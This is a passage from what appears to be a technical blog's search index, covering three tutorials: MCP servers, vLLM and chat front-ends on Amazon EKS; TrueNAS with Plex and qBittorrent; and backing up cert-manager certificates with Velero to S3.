${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-ollama.yml,kubeconfig-${CLUSTER_NAME}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "MCP Servers running on Kubernetes", "url": "/posts/mcp-servers-k8s/", "categories": "Kubernetes, Amazon EKS Auto Mode, MCP", "tags": "amazon eks auto mode, amazon eks, k8s, kubernetes, mcp", "date": "2025-05-27 00:00:00 +0200", "content": "In the previous post, Build secure and cheap Amazon EKS Auto Mode I used cert-manager to obtain a wildcard certificate for the Ingress. This post will explore running various MCP servers in Kubernetes, aiming to power a web chat application like ChatGPT for data queries. This post will guide you through the following steps: ToolHive Installation: Setting up ToolHive, a secure manager for MCP servers in Kubernetes. MCP Server Deployment: Deploying mkp and osv MCP servers. LibreChat Installation: Installing and configuring LibreChat, a self-hosted web chat application. vLLM Installation: Setting up vLLM, a high-throughput inference engine for Large Language Models. Open WebUI Installation: Setting up Open WebUI, a user-friendly interface for chat interactions. By the end of this tutorial, you‚Äôll have a fully functional chat application powered by MCP servers and local LLM inference running on your EKS cluster. Requirements Amazon EKS Auto Mode cluster (described in Build secure and cheap Amazon EKS Auto Mode) AWS CLI eksctl Helm kubectl You will need the following environment variables. Replace the placeholder values with your actual credentials: Variables used in the following steps: export AWS_REGION=\"${AWS_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install ToolHive ToolHive is an open-source, lightweight, and secure manager for MCP (Model Context Protocol) servers, designed to simplify the deployment and management of AI model servers in Kubernetes environments. Install toolhive-operator-crds and toolhive-operator helm charts. Install the toolhive-operator-crds and toolhive-operator Helm charts: # renovate: datasource=github-tags depName=stacklok/toolhive extractVersion=^toolhive-operator-crds-(?&lt;version&gt;.*)$ TOOLHIVE_OPERATOR_CRDS_HELM_CHART_VERSION=\"0.0.13\" helm upgrade --install --version=\"${TOOLHIVE_OPERATOR_CRDS_HELM_CHART_VERSION}\" toolhive-operator-crds oci://ghcr.io/stacklok/toolhive/toolhive-operator-crds # renovate: datasource=github-tags depName=stacklok/toolhive extractVersion=^toolhive-operator-(?&lt;version&gt;.*)$ TOOLHIVE_OPERATOR_HELM_CHART_VERSION=\"0.2.1\" helm upgrade --install --version=\"${TOOLHIVE_OPERATOR_HELM_CHART_VERSION}\" --namespace toolhive-system --create-namespace toolhive-operator oci://ghcr.io/stacklok/toolhive/toolhive-operator Deploy MCP Servers Create a secret with your GitHub token and deploy the mkp and osv MCP servers: # renovate: datasource=github-tags depName=stacklok/toolhive TOOLHIVE_VERSION=\"0.2.3\" kubectl apply -f https://raw.githubusercontent.com/stacklok/toolhive/refs/tags/v${TOOLHIVE_VERSION}/examples/operator/mcp-servers/mcpserver_mkp.yaml Create the OSV MCP Servers: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-toolhive-mcpserver-osv.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: toolhive.stacklok.dev/v1alpha1 kind: MCPServer metadata: name: osv namespace: toolhive-system spec: image: ghcr.io/stackloklabs/osv-mcp/server transport: streamable-http port: 8080 permissionProfile: type: builtin name: network resources: limits: cpu: 100m memory: 128Mi requests: cpu: 50m memory: 64Mi EOF Enabling Karpenter to Provision amd64 Node Pools vLLM only works with Nvidia GPU and amd64-based CPU instances. To enable Karpenter to provision an amd64 node pool, create a new NodePool resource as shown below: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-amd64.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default-gpu spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 40Gi --- apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64-gpu spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default-gpu requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"amd64\"] - key: node.kubernetes.io/instance-type operator: In # g6.xlarge: NVIDIA L4 GPU, 4 vCPUs, 16 GiB RAM, x86_64 architecture values: [\"g6.xlarge\"] taints: - key: nvidia.com/gpu value: \"true\" effect: NoSchedule limits: cpu: 16 memory: 64Gi nvidia.com/gpu: 4 --- apiVersion: eks.amazonaws.com/v1 kind: NodeClass metadata: name: my-default-amd64 spec: $(kubectl get nodeclasses default -o yaml | yq '.spec | pick([\"role\", \"securityGroupSelectorTerms\", \"subnetSelectorTerms\"])' | sed 's/\\(.*\\)/ \\1/') ephemeralStorage: size: 40Gi --- apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64 spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default-amd64 requirements: - key: eks.amazonaws.com/instance-category operator: In values: [\"t\"] - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: topology.kubernetes.io/zone operator: In values: [\"${AWS_REGION}a\"] - key: kubernetes.io/arch operator: In values: [\"amd64\"] limits: cpu: 8 memory: 32Gi EOF Install vLLM vLLM is a high-throughput and memory-efficient inference engine for Large Language Models (LLMs). It provides fast and scalable LLM serving with features like continuous batching, PagedAttention, and support for various model architectures. Set up PersistentVolume (PV) and PersistentVolumeClaim (PVC) to store vLLM chat templates: kubectl create namespace vllm tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-vllm-vllm-chat-templates.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: v1 kind: PersistentVolumeClaim metadata: name: vllm-templates-pvc namespace: vllm spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi --- apiVersion: v1 kind: Pod metadata: name: vllm-templates-downloader namespace: vllm spec: containers: - name: vllm-templates-downloader image: busybox:latest command: [\"wget\", \"-P\", \"/data/\", \"https://raw.githubusercontent.com/vllm-project/vllm/66785cc05c05c7f19f319533c23d1998b9d80bf9/examples/template_chatml.jinja\"] volumeMounts: - mountPath: /data name: vllm-templates volumes: - name: vllm-templates persistentVolumeClaim: claimName: vllm-templates-pvc restartPolicy: Never EOF kubectl wait --for=jsonpath='{.status.phase}'=Succeeded pod/vllm-templates-downloader -n vllm kubectl delete pod vllm-templates-downloader -n vllm Install vllm helm chart and modify the default values. # renovate: datasource=helm depName=vllm registryUrl=https://vllm-project.github.io/production-stack VLLM_HELM_CHART_VERSION=\"0.1.5\" helm repo add vllm https://vllm-project.github.io/production-stack cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-vllm.yml\" &lt;&lt; EOF servingEngineSpec: runtimeClassName: \"\" modelSpec: # https://huggingface.co/TinyLlama/TinyLlama-1.1B-Chat-v1.0/resolve/main/config.json (license: apache-2.0) - name: tinyllama-1-1b-chat-v1-0 annotations: model: tinyllama-1-1b-chat-v1-0 podAnnotations: model: tinyllama-1-1b-chat-v1-0 repository: vllm/vllm-openai tag: latest modelURL: TinyLlama/TinyLlama-1.1B-Chat-v1.0 replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 0 limitCPU: 8 limitMemory: 32Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 5Gi # https://huggingface.co/microsoft/phi-2/resolve/main/config.json (license: apache-2.0) - name: phi-2 annotations: model: phi-2 podAnnotations: model: phi-2 repository: vllm/vllm-openai tag: latest modelURL: microsoft/phi-2 replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 1 limitCPU: 8 limitMemory: 32Gi chatTemplate: \"/templates/template_chatml.jinja\" nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 20Gi - name: granite-3-1-3b-a800m-instruct annotations: model: granite-3-1-3b-a800m-instruct podAnnotations: model: granite-3-1-3b-a800m-instruct repository: vllm/vllm-openai tag: latest modelURL: ibm-granite/granite-3.1-3b-a800m-instruct replicaCount: 1 requestCPU: 2 requestMemory: 8Gi requestGPU: 1 limitCPU: 8 limitMemory: 32Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] pvcStorage: 20Gi routerSpec: resources: requests: cpu: 1 memory: 2Gi limits: cpu: 2 memory: 4Gi nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/arch operator: In values: [\"amd64\"] EOF helm upgrade --install --version \"${VLLM_HELM_CHART_VERSION}\" --namespace vllm --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-vllm.yml\" vllm vllm/vllm-stack Install LibreChat LibreChat is an open-source, self-hosted web chat application designed as an enhanced alternative to ChatGPT. It supports multiple AI providers (including OpenAI, Azure, Google, and more), offers a user-friendly interface, conversation management, plugin support, and advanced features like prompt templates and file uploads. Create librechat namespace and secrets with environment variables: kubectl create namespace librechat ( set +x kubectl create secret generic --namespace librechat librechat-credentials-env \\ --from-literal=CREDS_KEY=\"$(openssl rand -hex 32)\" \\ --from-literal=CREDS_IV=\"$(openssl rand -hex 16)\" \\ --from-literal=JWT_SECRET=\"$(openssl rand -hex 32)\" \\ --from-literal=JWT_REFRESH_SECRET=\"$(openssl rand -hex 32)\" ) Install librechat helm chart and modify the default values. # renovate: datasource=helm depName=librechat registryUrl=https://charts.blue-atlas.de LIBRECHAT_HELM_CHART_VERSION=\"1.8.10\" helm repo add librechat https://charts.blue-atlas.de cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-librechat.yml\" &lt;&lt; EOF librechat: # https://www.librechat.ai/docs/configuration/dotenv configEnv: ALLOW_EMAIL_LOGIN: \"true\" ALLOW_REGISTRATION: \"true\" ENDPOINTS: agents,custom existingSecretName: librechat-credentials-env # https://github.com/danny-avila/LibreChat/blob/main/librechat.example.yaml configYamlContent: | version: 1.2.1 cache: true endpoints: custom: - name: vLLM apiKey: vllm baseURL: http://vllm-router-service.vllm.svc.cluster.local/v1 models: default: ['TinyLlama/TinyLlama-1.1B-Chat-v1.0'] fetch: true mcpServers: mkp: type: sse url: http://mcp-mkp-proxy.toolhive-system.svc.cluster.local:8080/sse osv: type: sse url: http://mcp-osv-proxy.toolhive-system.svc.cluster.local:8080/sse imageVolume: enabled: false image: tag: \"v0.8.0-rc1\" ingress: annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: LibreChat is an open-source, self-hosted web chat application designed as an enhanced alternative to ChatGPT gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/danny-avila/LibreChat/8f20fb28e549949b05e8b164d8a504bc14c0951a/client/public/assets/logo.svg gethomepage.dev/name: LibreChat nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - host: librechat.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - librechat.${CLUSTER_FQDN} # https://github.com/bitnami/charts/blob/main/bitnami/mongodb/values.yaml mongodb: nodeSelector: kubernetes.io/arch: amd64 meilisearch: enabled: false EOF helm upgrade --install --version \"${LIBRECHAT_HELM_CHART_VERSION}\" --namespace librechat --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-librechat.yml\" librechat librechat/librechat LibreChat Install Open WebUI Open WebUI is a user-friendly web interface for chat interactions. Install open-webui helm chart and modify the default values. # renovate: datasource=helm depName=open-webui registryUrl=https://helm.openwebui.com OPEN_WEBUI_HELM_CHART_VERSION=\"7.0.1\" helm repo add open-webui https://helm.openwebui.com/ cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-open-webui.yml\" &lt;&lt; EOF ollama: enabled: false pipelines: enabled: false ingress: enabled: true annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Open WebUI is a user friendly web interface for chat interactions. gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/open-webui/open-webui/14a6c1f4963892c163821765efcc10c5c4578454/static/static/favicon.svg gethomepage.dev/name: Open WebUI nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri host: open-webui.${CLUSTER_FQDN} persistence: size: 3Gi extraEnvVars: - name: ADMIN_EMAIL value: ${MY_EMAIL} - name: ENV value: dev - name: WEBUI_URL value: https://open-webui.${CLUSTER_FQDN} - name: OPENAI_API_BASE_URL value: http://vllm-router-service.vllm.svc.cluster.local/v1 - name: DEFAULT_MODELS value: TinyLlama/TinyLlama-1.1B-Chat-v1.0 - name: ENABLE_EVALUATION_ARENA_MODELS value: \"False\" - name: ENABLE_CODE_INTERPRETER value: \"False\" EOF helm upgrade --install --version \"${OPEN_WEBUI_HELM_CHART_VERSION}\" --namespace open-webui --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-open-webui.yml\" open-webui open-webui/open-webui Open WebUI Clean-up Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{k8s-toolhive-mcpserver-osv,k8s-karpenter-nodepool-amd64,k8s-vllm-vllm-chat-templates,helm_values-{vllm,librechat,open-webui}}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "TrueNAS CE 25.04 with Plex and qBittorrent", "url": "/posts/truenas-plex-torrent/", "categories": "qbittorrent, plex, truenas", "tags": "qbittorrent, plex, truenas", "date": "2025-02-18 00:00:00 +0100", "content": "I had the opportunity to test the Dell OptiPlex 3000 Thin Client with TrueNAS Community Edition 25.04. The machine is equipped with 2 CPUs, 8GB of RAM, and 64GB of eMMC storage. üïπÔ∏è Recorded screen cast: Installation Put the TrueNAS CE 25.04 ISO on a USB stick using balenaEtcher. Make sure to disable Secure Boot in the BIOS before proceeding. Boot TrueNAS from the USB stick and follow these steps: Shell Run commands: sed -i 's/-n3:0:0/-n3:0:+16G/' /usr/lib/python3/dist-packages/truenas_installer/install.py exit Install/Upgrade Select the disk to install TrueNAS (mmcblk0) Administrative user (truenas_admin) ‚Ä¶ Links: How to Install TrueNAS CORE on an SSD NVMe/SATA Partition and Reclaim Unused Boot-Pool Space Install TrueNAS SCALE on a partition instead of the full disk Configuration The admin username for the TrueNAS WebUI is truenas_admin, and the password is the same as the root password set during the installation. Settings Configure General Settings (GUI, Localization, and Email Settings), Advanced Settings (Access), Services (SMB, SSH), and Shell (Create and Export pool): graph LR subgraph truenas[TrueNAS] system[System] --&gt; general_settings[General Settings] system --&gt; advanced_settings[Advanced Settings] system --&gt; services[Services] system --&gt; shell[Shell] end subgraph general_settings_dashboard[General Settings] general_settings --&gt; gui_settings[GUI Settings] gui_settings --&gt; web_interface_http_https_redirect[Web Interface HTTP -&gt; HTTPS Redirect] general_settings --&gt; localization_settings[Localization Settings] localization_settings --&gt; timezone[Timezone: Europe/Prague] general_settings --&gt; email_settings[Email Settings] email_settings --&gt; send_mail_method[Send Mail Method: GMail OAuth] end subgraph advanced_settings_dashboard[Advanced Settings] advanced_settings --&gt; access_configure[Access Configure] access_configure --&gt; session_timeout[Session Timeout: 30000] end subgraph services_dashboard[Services] services --&gt; smb[SMB] services --&gt; ssh[SSH] end subgraph shell_dashboard[Shell] shell --&gt; commands[$ sudo su&lt;br&gt;# sgdisk -n0:0:0 -t0:BF01 /dev/mmcblk0&lt;br&gt;# partprobe&lt;br&gt;# zpool create -f -R /mnt -O compression=lz4 -O atime=off my-local-disk-pool /dev/mmcblk0p4&lt;br&gt;# zpool export my-local-disk-pool] end click general_settings \"https://truenas.local/ui/system/general\" click advanced_settings \"https://truenas.local/ui/system/advanced\" click services \"https://truenas.local/ui/system/services\" click shell \"https://truenas.local/ui/system/shell\" style commands text-align:left Create and Import Storage pool Import the previously created pool (my-local-disk-pool) and create a new pool named my-pool: graph LR subgraph truenas[TrueNAS] storage[Storage] end subgraph storage_dashboard[Storage Dashboard] storage --&gt; import_pool[Import Pool] import_pool --&gt; pool[Pool: my-local-disk-pool] storage --&gt; create_pool[Create Pool] create_pool --&gt; name[Name: my-pool&lt;br&gt;Layout: Stripe&lt;br&gt;] end click storage \"https://truenas.local/ui/storage\" click create_pool \"https://truenas.local/ui/storage/create\" Create Dataset Create the data dataset in the my-pool pool and the plex dataset in the my-local-disk-pool storage pool, ensuring proper permissions are configured for each: graph LR subgraph truenas[TrueNAS] datasets[Datasets] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name_my_pool[Dataset Name: my-pool] dataset_name_my_pool --&gt; add_dataset_my_pool[Add Dataset] add_dataset_my_pool --&gt; name_data[Name: data] add_dataset_my_pool --&gt; dataset_preset_data[Dataset Preset -&gt; SMB] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name_my_local_disk_pool[Dataset Name: my-local-disk-pool] dataset_name_my_local_disk_pool --&gt; add_dataset_my_local_disk_pool[Add Dataset] add_dataset_my_local_disk_pool --&gt; name_data_plex[Name: plex] add_dataset_my_local_disk_pool --&gt; dataset_preset_plex[Dataset Preset -&gt; Apps] end click datasets \"https://truenas.local/ui/datasets\" graph LR subgraph truenas[TrueNAS] datasets[Datasets] end subgraph datasets_dashboard[Datasets] datasets --&gt; dataset_name[Dataset Name: my-pool -&gt; data] dataset_name --&gt; permissions[Permissions -&gt; Edit] end subgraph edit_acl_dashboard[Edit ACL] permissions --&gt; add_item[\"\\+ Add Item\"] add_item --&gt; who[Who -&gt; Group] add_item --&gt; group[Group -&gt; apps] add_item --&gt; apply_permissions_recursively[Apply permissions recursively] add_item --&gt; save_access_control_list[Save Access Control List] end click datasets \"https://truenas.local/ui/datasets\" Configure Credentials Create a new user named ruzickap, and update the password and email address for the existing truenas_admin user: graph LR subgraph truenas[TrueNAS] credentials[Credentials] --&gt; backup_credentials[Backup Credentials] credentials --&gt; users[Users] end subgraph backup_credentials_dashboard[Backup Credentials] backup_credentials --&gt; provider[Provider: Microsoft OneDrive] provider --&gt; oauth_authentication[OAuth Authentication -&gt; Log In To Provider] backup_credentials --&gt; drives_list[Drives List -&gt; OneDrive] end subgraph users_dashboard_[Users] users --&gt; add[Add] add --&gt; add_full_name[Full Name: Petr Ruzicka] add --&gt; add_username[Username: ruzickap] add --&gt; add_password[Password: my_password] add --&gt; add_email[Email: petr.ruzicka\\@gmail.com] add --&gt; add_confirm_password[Confirm Password: my_password] add --&gt; add_confirm_password_auxiliary_groups[Auxiliary Groups: builtin_administrators, docker] add --&gt; add_home_directory[Home Directory: /mnt/my-local-disk-pool] add --&gt; add_ssh_password_login_enabled[SSH password login enabled] add --&gt; add_shell[Shell: bash] add --&gt; add_allow_all_sudo_commands[Allow all sudo commands] add --&gt; add_allow_all_sudo_commands_with_no_password[Allow all sudo commands with no password] add --&gt; add_create_home_directory[Create Home Directory] users --&gt; truenas_admin[truenas_admin] truenas_admin --&gt; edit[Edit] edit --&gt; edit_new_password[New Password: my_password] edit --&gt; edit_email[Email: petr.ruzicka\\@gmail.com] edit --&gt; edit_confirm_new_password[Confirm New Password: my_password] edit --&gt; edit_allow_all_sudo_commands_with_no_password[Allow all sudo commands with no password] end click users \"https://truenas.local/ui/credentials/users\" click backup_credentials \"https://truenas.local/ui/credentials/backup-credentials\" Add Applications Configure the applications to use the my-local-disk-pool pool as their designated storage location: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; configuration[Configuration] configuration --&gt; choose_pool[Choose Pool] choose_pool --&gt; pool[Pool: my-local-disk-pool] end click apps \"https://truenas.local/ui/apps/installed\" OpenSpeedTest Install the OpenSpeedTest application to easily measure network speed and performance: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; open_speed_test[Open Speed Test] open_speed_test --&gt; install[Install] end click apps \"https://truenas.local/ui/apps/installed\" Test the OpenSpeedTest web interface by accessing it through the local instance. File Browser Add the File Browser application to manage files easily through a user-friendly web interface: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; file_browser[File Browser] file_browser --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; additional_storage[Additional Storage -&gt; Add] additional_storage --&gt; data_storage_type[Type: Host Path] additional_storage --&gt; mount_path[Mount Path: /data] additional_storage --&gt; host_path[Host Path: /mnt/my-pool/data] end click apps \"https://truenas.local/ui/apps/installed\" Test the File Browser web interface by clicking the File Browser link and using the following login credentials: User: admin Password: admin qBittorrent Install the qBittorrent application to download torrents: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; qbittorrent[qBittorrent] qbittorrent --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; qbittorrent_downloads_storage[qBittorrent Downloads Storage] qbittorrent_downloads_storage --&gt; qbittorrent_configuration_storage_type[Type: Host Path] qbittorrent_downloads_storage --&gt; qbittorrent_configuration_storage_mount_path[Host Path: /mnt/my-pool/data] end click apps \"https://truenas.local/ui/apps/installed\" qBittorrent Configuration It is necessary to configure qBittorrent to work properly with the configured pools and datasets. Obtain the username and password for qBittorrent: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; qbittorrent[qbittorrent] qbittorrent --&gt; workloads[Workloads] workloads --&gt; qbittorrent_running[qbittorrent ‚Äì Running] qbittorrent_running --&gt; view_logs[View Logs] view_logs --&gt; password[A temporary password is provided for this session: xxxxxx] end click apps \"https://truenas.local/ui/apps/installed\" Access the qBittorrent web interface and log in using the credentials obtained from the logs. Click the Options icon (typically a gear symbol) at the top and configure the following settings: graph LR options[Options] --&gt; downloads[Downloads] options[Options] --&gt; webui[WebUI] downloads --&gt; save_path[Delete .torrent files afterwards] downloads --&gt; default_save_path[Default Save Path: /downloads/torrents] webui --&gt; bypass[Bypass authentication for clients in whitelisted IP subnets: 192.168.1.0/24] Plex Install the Plex application for media streaming: graph LR subgraph truenas[TrueNAS] apps[Apps] end subgraph applications_installed_dashboard[Applications Installed] apps --&gt; discover_apps[Discover Apps] discover_apps --&gt; plex[Plex] plex --&gt; install[Install] install --&gt; storage_configuration[Storage Configuration] storage_configuration --&gt; plex_data_storage[Plex Data Storage] plex_data_storage --&gt; plex_data_storage_type[Type: Host Path] plex_data_storage --&gt; plex_data_storage_host_path[Host Path: /mnt/my-pool/data] storage_configuration --&gt; plex_configuration_storage[Plex Configuration Storage] plex_configuration_storage --&gt; plex_configuration_storage_type[Type: Host Path] plex_configuration_storage --&gt; plex_configuration_storage_host_path[Host Path: /mnt/my-local-disk-pool/plex] end click apps \"https://truenas.local/ui/apps/installed\" Configure Data Protection Configure Cloud Sync Tasks to back up Plex data to Microsoft OneDrive, and schedule regular S.M.A.R.T. tests: graph LR subgraph truenas[TrueNAS] data_protection[Data Protection] end subgraph data_protection_dashboard[Data Protection] data_protection --&gt; cloud_sync_tasks[Cloud Sync Tasks -&gt; Add] cloud_sync_tasks --&gt; provider[Credentials: Microsoft OneDrive] provider --&gt; what_and_when_direction[Direction: PUSH] provider --&gt; what_and_when_directory_files[Directory/Files: /mnt/my-local-disk-pool/plex] provider --&gt; what_and_when_folder[Folder: /truenas-backup-plex] provider --&gt; what_and_when_schedule[Schedule: Weekly] data_protection --&gt; periodic_smart_tests[Periodic S.M.A.R.T. Tests -&gt; Add] periodic_smart_tests --&gt; all_disks[All Disks] periodic_smart_tests --&gt; type[Type: SHORT] periodic_smart_tests --&gt; schedule[Schedule: Weekly] end click data_protection \"https://truenas.local/ui/data-protection\" Enjoy ‚Ä¶ üòâ" }, { "title": "Amazon EKS Auto Mode with cert-manager and Velero", "url": "/posts/eks-auto-cert-manager-velero/", "categories": "Kubernetes, Amazon EKS Auto Mode, Velero, cert-manager", "tags": "amaozn eks auto mode, amazon eks, cert-manager, certificates, eksctl, k8s, kubernetes, security, velero", "date": "2025-02-01 00:00:00 +0100", "content": "In the previous post, ‚ÄúBuild secure and cheap Amazon EKS Auto Mode‚Äù, I used cert-manager to obtain a wildcard certificate for the Ingress. When using Let‚Äôs Encrypt production certificates, it is useful to back them up and restore them when recreating the cluster. Here are a few steps to install Velero and perform the backup and restore procedure for cert-manager objects. Links: Backup and Restore Resources Requirements An Amazon EKS Auto Mode cluster (as described in ‚ÄúBuild secure and cheap Amazon EKS Auto Mode‚Äù) AWS CLI eksctl Helm kubectl The following variables are used in the subsequent steps: export AWS_REGION=\"${AWS_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags applied to identify AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Generate a Let‚Äôs Encrypt production certificate These steps only need to be performed once. Production-ready Let‚Äôs Encrypt certificates should generally be generated only once. The goal is to back up the certificate and then restore it whenever needed for a new cluster. Create a Let‚Äôs Encrypt production ClusterIssuer: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-production-dns namespace: cert-manager labels: letsencrypt: production spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-production-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: {} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all kubectl label secret --namespace cert-manager letsencrypt-production-dns letsencrypt=production Create a new certificate and have it signed by Let‚Äôs Encrypt for validation: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-monthly-backup-cert-manager-production; then tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-production namespace: cert-manager labels: letsencrypt: production spec: secretName: ingress-cert-production secretTemplate: labels: letsencrypt: production issuerRef: name: letsencrypt-production-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-production fi Create S3 bucket The following step needs to be performed only once. Use CloudFormation to create an S3 bucket that will be used for storing Velero backups. if ! aws s3 ls \"s3://${CLUSTER_FQDN}\"; then cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Parameters: S3BucketName: Description: Name of the S3 bucket Type: String EmailToSubscribe: Description: Confirm subscription over email to receive a copy of S3 events Type: String Resources: S3Bucket: Type: AWS::S3::Bucket Properties: BucketName: !Ref S3BucketName PublicAccessBlockConfiguration: BlockPublicAcls: true BlockPublicPolicy: true IgnorePublicAcls: true RestrictPublicBuckets: true LifecycleConfiguration: Rules: # Transitions objects to the ONEZONE_IA storage class after 30 days - Id: TransitionToOneZoneIA Status: Enabled Transitions: - TransitionInDays: 30 StorageClass: STANDARD_IA - Id: DeleteOldObjects Status: Enabled ExpirationInDays: 60 BucketEncryption: ServerSideEncryptionConfiguration: - ServerSideEncryptionByDefault: SSEAlgorithm: aws:kms KMSMasterKeyID: alias/aws/s3 S3BucketPolicy: Type: AWS::S3::BucketPolicy Properties: Bucket: !Ref S3Bucket PolicyDocument: Version: \"2012-10-17\" Statement: # S3 Bucket policy force HTTPs requests - Sid: ForceSSLOnlyAccess Effect: Deny Principal: \"*\" Action: s3:* Resource: - !GetAtt S3Bucket.Arn - !Sub ${S3Bucket.Arn}/* Condition: Bool: aws:SecureTransport: \"false\" S3Policy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${S3BucketName}-s3\" Description: !Sub \"Policy required by Velero to write to S3 bucket ${S3BucketName}\" PolicyDocument: Version: 